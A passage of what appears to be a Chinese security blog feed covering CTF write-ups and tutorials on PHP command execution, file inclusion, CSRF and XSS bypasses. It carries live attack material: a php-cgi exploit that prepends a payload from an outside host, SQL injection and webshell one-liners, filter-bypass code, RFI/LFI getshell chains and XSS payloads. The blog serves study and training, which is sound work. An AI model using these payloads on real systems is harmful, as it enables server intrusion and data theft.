访问https://authme.wechall.net/challenge/space/auth_me/www/index.php 提示说： Error Renegotiation is not allowed 所以我们需要去找这个证书，然后导入。 其实，你观察下它 apache.conf 的网址， http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf** 会发现叫做 find_me 的文件夹。直接访问 apache.conf 05-May-2015 21:18 1.0K client.crt 05-May-2015 21:18 1.5K client.key 05-May-2015 21:18 3.2K client.p12 05-May-2015 21:18 4.7K server.crt 05-May-2015 21:18 1.5K 导入client.p12 即可 Warchall: Live RCE具体漏洞是：CVE-2012-1823（PHP-CGI RCE） 在地址后面加进参数运行对应的php-cgi 参数的行为,根据解释，如果query string中不包含未urlencoded的等号，那么整个query会以空格分词，传给php-cgi。于是我们传-s，就会把php文件源码回显。 例如 index.php?-s 相参于/usr/bin/php53-cgi/php-cgi -f index.php -s php-cgi –help如下 Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;] php-cgi &lt;file&gt; [args...] -a Run interactively -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode -C Do not chdir to the script&apos;s directory -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory -n No php.ini file will be used -d foo[=bar] Define INI entry foo with value &apos;bar&apos; -e Generate extended information for debugger/profiler -f &lt;file&gt; Parse &lt;file&gt;. Implies `-q&apos; -h This help -i PHP information -l Syntax check only (lint) -m Show compiled in modules -q Quiet-mode. Suppress HTTP Header output. -s Display colour syntax highlighted source. -v Version number -w Display source with stripped comments and whitespace. -z &lt;file&gt; Load Zend extension &lt;file&gt;. -T &lt;count&gt; Measure execution time of script repeated &lt;count&gt; times. 查看源码： http://rce.warchall.net/?-s 里面包含了一个../config.php,所以我要去读它。 在刚开始进的页面里发现index.php的目录为： [SCRIPT\_FILENAME] =&gt; /home/level/20_live_rce/www/index.php 所以../config.php 的绝对路径是： /home/level/20_live_rce/config.php php-cgi参数中： d foo[=bar] Define INI entry foo with value ‘bar’ -dallow_url_include=On -dauto_prepend_file=/tmp/2.php 在/tmp里建立一个2.php内容是 &lt;?php exec(&quot;cat /home/level/20_live_rce/config.php&quot;,$out); print_r($out); ?&gt; 构造地址： http://rce.warchall.net/?-d allow_url_include=On -d auto_prepend_file=http://oacotcyq8.bkt.clouddn.com/2.php -n urlencode: http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n Blinded by the lighter还是盲注，加时间延迟注入。 Light in the Darkness这道题的错误会回显，而且限制要在2次query内得到答案，所以用error based： POC1: &#39; or row(1,1) &gt; (select count(*),concat(password,&#39;$&#39;,floor(rand(0)*2))x from (select 1 union select 2 union select 3)a group by x limit 1) # POC2: &#39; or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))-- 原理： http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do 简单地说，floor(rand(0)*2)会得到0,1,1,0……第2个和第3个重复的1会造成重复的group_key。而且我们需要一个行数大于3的表，所以选择information_schema Brainfuckedalert(XXX)xxx为 文件内容。 function anonymous() { var s = &apos;UnfudgedDebugStuff&apos;; s = s.length; alert(s); document.location.href=&apos;https://www.google.co.uk&apos;; } eXtract Me一个压缩包，解压发现里面一直有个压缩包，应该不是这么多 解压一次之后使用16进制打开 可以发现是两个压缩包拼接在一起的。所以我们只要把后面的压缩包扣出来即可。 还是解压，出来一个xar文件，通过 7zip 解压，出来一个又一个奇葩文件。。 但是，在解压途中会发现有一个rar 的注释是有东西的。拷贝出来，用这数据新建一个rar文件，发现需要密码。 密码为：L0LYouThInkiTSh0uldB3SoEasY? Are you blind?还是盲注，报错来判断。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[远程代码执行漏洞总结]]></title>
    <url>%2F2016%2F07%2F23%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[远程代码执行是指程序代码在处理输入输出的时候没有严格控制。导致用户可以构造参数包含执行远程代码在服务器上执行，进而获取到服务器权限，是发生在应用程序的逻辑层上的漏洞 0x01 OS命令执行系统命令执行是指应用程序对传入命令行的参数过滤不严格导致恶意用户能控制最终执行的命令，进而入侵系统，导致严重破坏的高危漏洞。(bash,shell) shell是系统的用户界面，提供用户与内核交互操作的接口，它接收用户输入的命令并把它送入到内核去执行。实际上shell是一个命令解释器，它的一个重要特性就是它自身就是一个解释型的程序语言。 分类： 1.1 OS本身命令执行 1.2 Web命令执行 1.3 数据库命令执行 1.4 第三方软件命令执行 0x02 命令执行模型0x02.1 PHP命令执行函数利用1、system：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型为： string system(string command,int &amp;return_var) 其中，command是要执行的命令，return_var存放执行命令的执行后的状态 示例代码如下： &lt;?php $dir = $_GET[&quot;dir&quot;]; if(isset($dir)) { echo &quot;&lt;pre&gt;&quot;; system(&quot;net user&quot;.$dir); echo &quot;&lt;/pre&gt;&quot;; } ?&gt; 执行结果为： 上述代码就是把dir这个命令写死了，把net user执行的结果给$dir变量。但是注意一些连接符，管道符如：&amp;,&amp;&amp;,|,||,:等，如果我们输入?dir=| netstat -an 注：|只执行后面的命令，||前后命令都执行。 2、exec：exec函数可以用来执行一个外部的应用程序，函数原型为： string exec(string command,array &amp;output,int &amp;return_var) 其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var是存放执行命令后的状态值。 示例代码： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = array(); echo &quot;&lt;pre&gt;&quot;; exec($cmd,$output); echo &quot;&lt;/pre&gt;&quot;; while(list($key,$value)=each($output)) { echo $value.&quot;&lt;br&gt;&quot;; } ?&gt; 执行结果为： 3、passthru：passthru函数可以用来执行一个unix系统命令并显示原始的输出，当unix系统令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system和exec函数。原型为： void passthru(string command,int &amp;teturn_var) 其中command是要执行的命令，return_var存放执行命令后的状态值。 示例代码如下： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; passthru($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 4、shell_exec：执行shell命令并返回输出的字符串，函数原型为u： string shell_exec(string command) 其中command是要执行的命令。 &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; shell_exec($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 5、`运算符：与shell_exec功能相同，通常用于绕过黑名单 示例代码如下： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = `$cmd`; echo &quot;&lt;pre&gt;&quot;; echo $output; echo &quot;&lt;/pre&gt;&quot;; ?&gt; 执行结果为： 0x02.2 eval注入攻击利用出来可以利用函数命令注入攻击方式外还可以使用eval注入攻击方式，eval函数会将参数字符串作为php程序代码来执行，用户可以将php代码保存成字符串的形式，然后传递给eval函数执行。原型为： mixed eval(string code_str) 其中code_str是php代码字符串，通过构造传入eval函数中的全部或部分字符串的内容实现命令注入攻击。 示例代码： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; eval($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 如果传入的内容为phpinfo();,若传入的是一句话木马&lt;?php eval($_POST[cmd]);?&gt;就可以直接拿shell。 示例结果为： 0x02.3 PHP webshell命令执行防御及绕过方法0x02.3.1 PHP禁止webshell执行命令防御PHP的配置文件php.ini里面有个disable_functions =配置这个，禁止某些php函数，便可以禁止php的命令执行漏洞，例如： disable_functions=system,passthru,shell_exec,exec,popen 0x02.3.2 PHP webshell命令执行绕过方法1.黑名单绕过 php能够执行系统命令的函数有： assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`(反单引号) 根据黑名单中没有的函数，即可绕过。 2.系统组件绕过 只适用于windows，代码如下： &lt;?php $command = $_POST[a]; $wsh = new COM(&apos;WScript.shell&apos;); //生成一个COM对象 $exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command); //调用对象方法来执行命令 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput ?&gt; 如何防御：直接删除system32下的wshom.ocx文件 2.拓展库绕过 0x02.4 PHP create_function()注入命令执行漏洞在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个简单的代码审计和MD5爆破脚本]]></title>
    <url>%2F2016%2F07%2F21%2F%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8CMD5%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[0x01 php是最好的语言代码审计。 描述：据说php是最好的语言，perfect？来试试看。地址：http://218.76.35.75:20114/源码如下： &lt;?php show_source(__FILE__); $v1=0;$v2=0;$v3=0; $a=(array)json_decode(@$_GET[&apos;foo&apos;]); if(is_array($a)){ is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; } if(is_array(@$a[&quot;bar2&quot;])){ if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; } $v2=1; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; } } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo $flag; } ?&gt; tips：在本地搭建环境一个一个输出，看是什么情况 构造源码如下： &lt;?php $v1=0;$v2=0;$v3=0; //给3个变量赋值 $a=(array)json_decode(@$_GET[&apos;foo&apos;]); //json_decode解码，所以要知道编码的样式 var_dump($a); echo &apos;&lt;/br&gt;&apos;; var_dump($_GET[&apos;foo&apos;]); echo &apos;&lt;/br&gt;&apos;; if(is_array($a)){ //判断是不是数组 echo ($a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; echo is_numeric(@$a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope1&quot;):NULL; //判断是不是纯数字或数字字符串，如果是就die输出nope1 if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; //php弱类型，其他类型和整形比较时，先把其他类型转化为整形 echo $v1; echo &apos;&lt;/br&gt;&apos;; } if(is_array(@$a[&quot;bar2&quot;])){ //判断是不是数组 if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope2&quot;); //or成立则die输出nope2，所以需要count($a[&quot;bar2&quot;])==5和is_array($a[&quot;bar2&quot;][0])有值 echo &quot;good1&quot;; echo &apos;&lt;/br&gt;&apos;; $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); //有a2，并且值中有字符串“nudt” var_dump($pos); $pos===false?die(&quot;nope3&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope3&quot;):NULL; //bar2中不能有字符nudt } $v2=1; echo ($v2); echo &apos;&lt;/br&gt;&apos;; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ //需要strcmp($c[1],$d)和$c[1]!==$d同时成立，即$c$d既相等又不相等 //php弱类型，strcmp函数中数组和字符串比较返回null echo &quot;good2&quot;; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope4&quot;):NULL; //eregi函数有个%00截断漏洞 echo &quot;good3&quot;; var_dump(strpos(($c[0].$d), &quot;htctf2016&quot;)); strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; $c[0]和$d连接返回字符串htctf2016的位置 echo &quot;good4&quot;; } echo $v3; } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo &quot;hello，Get It!&quot;; //echo &quot;flag{php_i5_n0t_b4d}&quot;; } ?&gt; 最终的POC为： http://127.0.0.1:8080/hetian/test.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],2,3,4,5],&quot;a2&quot;:&quot;nudt&quot;}&amp;cat[1][]=111&amp;cat[0]=aahtctf2016&amp;dog=%00 效果为： 0x02 忘记密码了描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么地址：http://218.76.35.75:20115 MD5爆破python脚本 打开其他的两个发现page是名字加三位数字的md5值。 脚本如下： # -*- coding: utf8 -*- import requests import hashlib url = &quot;http://218.76.35.75:20115/index.php?page=&quot; for id in range(100,999): id=str(id) id=&apos;slash&apos;+id #print id payload = hashlib.md5(id).hexdigest() poc = url+payload #print poc conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;文件不存在，请返回&quot;)&gt;0 or res.find(r&quot;error!&quot;)&gt;0: print &quot;error!&quot; else: print poc print payload break 效果如下：]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>编程</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF漏洞总结]]></title>
    <url>%2F2016%2F07%2F20%2FCSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CSRF（Cross-site request forgery跨站请求伪造，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 0x01 CSRF是什么？网站是通过cookie来识别用户的，当用户成功进行身份验证之后浏览器就会得到一个标识其身份的cookie，只要不关闭浏览器或者退出登录，以后访问这个网站会带上这个cookie。如果这期间浏览器被人控制着请求了这个网站的url，可能就会执行一些用户不想做的功能（比如修改个人资料）。因为这个不是用户真正想发出的请求，这就是所谓的请求伪造；呵呵，因为这些请求也是可以从第三方网站提交的，所以前缀跨站二字。 0x02 CSRF可以做什么？你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 0x03 CSRF与XSS的区别XSS： 攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击 CSRF： 攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击 CSRF少了一个 获取受害人的cookie的步骤。为什么会少了呢。因为受害人在执行代码的时候就已经完成的攻击，而攻击者并没有参与进来。 举个例子来说吧(受害者的网址是a.cn，攻击者的网址是b.cn)攻击者想要在某个网站(网站是某个开源CMS)添加上另一个管理员，但是这个网站并没有XSS漏洞。怎么办呢？这时攻击者发现了这个开源CMS后台添加管理员时并没有加入验证码或则token，只需要输入要添加的管理员账号和密码点击确定就可以添加管理员账户了。这时和我一样聪明的攻击者在自己的服务器上建立了一个html文件(假设地址是b.cn/index.html)。然后就给网站管理员发邮件等等，诱使管理员打开b.cn/index.html。当管理员打开后（这时管理员正在网站后台，或则管理员的session并没有失效的话），就可以神不知鬼不觉的在网站后台添加了一个管理员账户。 CSRF的两个侧重点： 1.csrf的攻击建立在浏览器和web服务器的会话之中 2.欺骗用户访问恶意url 0x04 CSRF实例0x04_1 CSRF快速脱库正常情况下，管理员备份数据库的方法是进入管理页面-管理中心-数据备份 我们现在用普通用户利用CSRF漏洞来备份网站的数据库。 第一步：建个用户,普通权限 第二步：构造备份数据库的链接 http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa 注：这个链接就是admin正常备份数据库的链接 第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码 第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义 第五步：访问我们自己构造的路径，即可得到数据库 http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql 0x04_2 CSRF修改密码比如某一套开源的CMS，知道改密码的链接，这样我们就可以把这些恶意代码，嵌入到某些页面，引诱管理员来访问，这样我们就改了管理员的密码。 这里用DVWA来演示实例。这里默认账户密码为admin/password 第一步：调安全级别为低，点击csrf 第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问 http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change# 第三步：成功修改管理员密码,之前的密码无法登陆 0x05 CSRF防御0x05_1 服务端的防御1.验证HTTP Referer字段 2.请求地址中添加token并验证 3.在HTTP头中自定义属性并验证 4.在服务端严格区分好POST与GET的数据请求 5.使用验证码或者密码确认方式进行 0x05_2 用户端的防御0x05_3 安全设备的防御]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞总结]]></title>
    <url>%2F2016%2F07%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。 0x01 什么是文件包含漏洞？简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件，如果不是我们有可能包含本地的文件。 0x02 文件包含漏洞产生的原因？PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 0x03 PHP包含漏洞分类主要分为两类： 1、本地文件包含LFI 2、远程文件包含RFI（需要php.ini中allow_url_include=on） PHP中四个包含文件的函数： include(),include_once(),require()和require_once() 它们的区别在于： include(),include\_once()在包含文件时，即使遇到错误，下面的代码依然会继续执行； 而require()和require_once()则会报错，直接退出程序。 0x04 本地文件包含测试代码main.php： &lt;?php echo &quot;Hello,this is file_include test!&quot;; //初始化 define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;); //加载模块 $page = $_GET[&apos;page&apos;]; echo ROOT.$page.&apos;.php&apos;; include(ROOT.$page.&apos;.php&apos;) ?&gt; 在同目录下创建1.php: &lt;?php phpinfo();?&gt; 请求/main.php?page=1 0x05 远程文件包含基于HTTP协议的测试代码 &lt;?php include($_GET[&apos;url&apos;]); ?&gt; 在远程主机放入一个2.txt，内容为 &lt;?php phpinfo();?&gt; 在请求的url参数中传入2.txt的地址http://oacotcyq8.bkt.clouddn.com/2.txt返回本机的phpinfo信息。 远程文件包含还有一种利用PHP输入输出流的利用方式，可以直接执行POST代码，只要执行POST请求main.php?url=php://input,POST的内容为&lt;?php phpinfo();?&gt;,即可打印出phpinfo信息。 0x06 文件包含漏洞实例0x06_1 本地文件包含实例1.首先有个正常的图片，里面包含一个phpinfo()函数。 2.打开DVWA上传含恶意代码的图片 3.利用文件包含访问链接： http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg 0x06_2 远程文件包含实例以Dedecms的一个远程文件包含漏洞为例 DedeCms &lt; 5.7-sp1远程文件包含漏洞，在了解这个漏洞之前，我们先了解一下Apache服务器解析文件流程。 当Apache检测到一个文件有多个扩展名时，比如1.php.bak,会从右向左判断，因为bak扩展名Apache不认识，所以就要向前解析，直到有一个Apache认识的扩展名，如果全部的扩展名都不认识，那么会按照httpd.conf配置中指定的方式进行展示，一般默认的是“text/plain”这种方式。我们了解完这个内容后再来分析下面这个漏洞。 这个问题出现在install/index.php.bak这个文件。看一下这个文件的代码： &lt;php? ……. else if($step==11) { require_once(‘../data/admin/config_update.php’); $rmurl = $updateHost.”dedecms/demodata.{$s_lang}.txt”; echo $rmurl; $sql_content = file_get_contents($rmurl); $fp = fopen($install_demo_name,’w’); if(fwrite($fp,$sql_content)) echo ‘ [√] 存在(您可以选择安装进行体验)’; else echo ‘ [×] 远程获取失败’; unset($sql_content); fclose($fp); exit(); …… ?&gt; 在上面的代码中我们看到在step=11中，首先包含了/data/admin/config_update.php这个文件，我们再打开这个文件，内容如下： &lt;?php /** * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 * * @version $Id: config_update.php 1 11:36 2011-2-21 tianya $ * @package DedeCMS.Administrator * @copyright Copyright (c) 2007 - 2010, DesDev, Inc. * @license http://help.dedecms.com/usersguide/license.html * @link http://www.dedecms.com */ //更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 $updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;; $linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;; 指定了updateHost变量的值。看起来是没有办法包含的，因为变量是固定值，但是如果我们指定了install_demo_name是config_update.php这文件，并且内容是一个404的文件，情形是怎么样子的呢？ 我们先来访问这个url:http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 这会让代码到 http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt 中取内容写入到 config_update.php，demodata.a.txt。你可能想要问了http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt 这个是什么呢？我们访问一下 其实什么都没有，所以变量覆盖以后，我们打开config_update.php以后，里面已经什么都没有了 这样updataHost变量的值便没有被初始化，那么我们想写什么就写什么了，这样就完成了一个远程文件包含漏洞的利用。构造一个url即可完成攻击： http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/ 0x06_2.1 编写脚本测试1.开始测试，打开dedecms，可以正常访问 2.然后检测脚本是否可以正常运行 3.脚本可以正常运行，然后我们测试漏洞是否可以利用成功，我们查看远程服务器的文件，如下图,我们在目录C:\wamp\www\dedecms\demodata.a.txt中写入需要我们写入web服务器中的内容，这样就可以写入xxx.php的文件中，从而达到getshell的目的。 4.攻击者远程IP地址 5.然后我们测试漏洞利用 6.打开web服务器的data目录，可以看到，文件已经成功的写到了web服务器中。DedeCMS-5.7-UTF8-SP1\uploads 7.我们访问一下 8.漏洞利用成功 0x06 文件包含漏洞利用技巧远程文件包含漏洞之所以能够执行命令，就是因为攻击者可以自定义被包含的文件内容。因此，本地文件包含漏洞要想执行命令，也需要找一个攻击者能够控制内容的本地文件。 目前主要有几下几种常见的技巧： 0x06_1 PHP包含读文件 php://filter/read=convert.base64-encode/resource=login.php 0x06_2 PHP包含写文件包含data://或php://input等伪协议。这需要目标服务器支持，同时要求allow_url_fopen为设置为ON。 http://ip_address/?page=php://input 并且POST数据为&lt;?php system(&apos;net user&apos;);?&gt; 0x06_3 包含日志文件当某个PHP文件存在文件包含漏洞，却无法上传文件时，这就意味着有包含漏洞却不能拿来利用，这时就可以利用apache日志文件来入侵 Apache服务器运行后会生成两个日志文件，access.log（访问日志）和error.log(错误日志)，apache会记录下我们的操作，并写入到访问日志access.log之中。 访问 http://ip_address/?page=../../../../Apache-20/logs/access.log 0x06_4 截断包含只适合于magic_quotes_gpc=off的时候。 hhtp://ip_address/?page=1.jpg%00 0x06_5 PHP内置协议file:///var/www/html 访问本地文件系统 ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLs data:// 数据流 http:// — 访问 HTTP(s) URLs ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流 zlib:// — 压缩流 data:// — Data (RFC 2397) glob:// — 查找匹配的文件路径模式 phar:// — PHP Archive ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — Audio streams expect:// — 处理交互式的流 0x06_6 包含Session文件。这部分需要攻击者能够控制部分Session文件的内容，PHP默认生成的Session文件一般存放在/tmp目录下。 0x06_7 包含/proc/self/environ文件。 http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ 这个也是一种通用的技巧，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容，常见的做法是向User-Agent中注入PHP代码来完成攻击。 补充强力推荐一篇文章：LFI、RFI、PHP封装协议安全问题学习]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>自动化</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过与防御总结]]></title>
    <url>%2F2016%2F07%2F18%2FXSS%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。 0x01 XSS的分类 反射型（非持久型） 存储型（持久型） DOM型 具体的一些介绍与简单的实例就不做详述了，本文主要介绍的是XSS的绕过技巧与防御。 0x02 XSS的绕过大小写绕过&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt; 编码绕过1.十六进制编码 2.jsfuck编码 3.url编码 4.unicode编码 &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt; &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; &apos;被过滤，我们可以将&apos;写为 &amp;#x27 将&quot;/&quot;转义为&quot;&amp;sol;&quot; 绕过magic_quotes_gpc&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 闭合标签&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt; &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 标签绕过&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; &lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt; &lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt; &quot;onsubmit=javascript:alert(1)%20name=&quot;a 其他符号绕过%0aalert(1); %0a 换行符 /**/ 替换空格 %00 截断 双字母绕过&lt;img ononerrorerror=&quot;123&quot;&gt; &lt;script&gt;alalertert(123)&lt;/script&gt; 宽字节绕过gbxxxx系列的编码，那么我们尝试一下宽字节 %c0 %bf %5c 其他事件绕过onload onclick onerror prompt confirm onmousemove CRLF injection绕过CRLF是”回车 + 换行”（\r\n）的简称。 http://www.xxx.com%0d%0a%0d%0a+xss代码 &lt;svg/onload=prompt(1)&gt; 0x03 XSS的防御 原则1：“Secure By Default”原则：不要往HTML页面中插入任何不可信数据 原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 原则7：使用富文本时，使用XSS规则引擎进行编码过滤]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python练习题]]></title>
    <url>%2F2016%2F07%2F16%2Fpython%E7%BB%83%E4%B9%A0%E9%A2%98%2F</url>
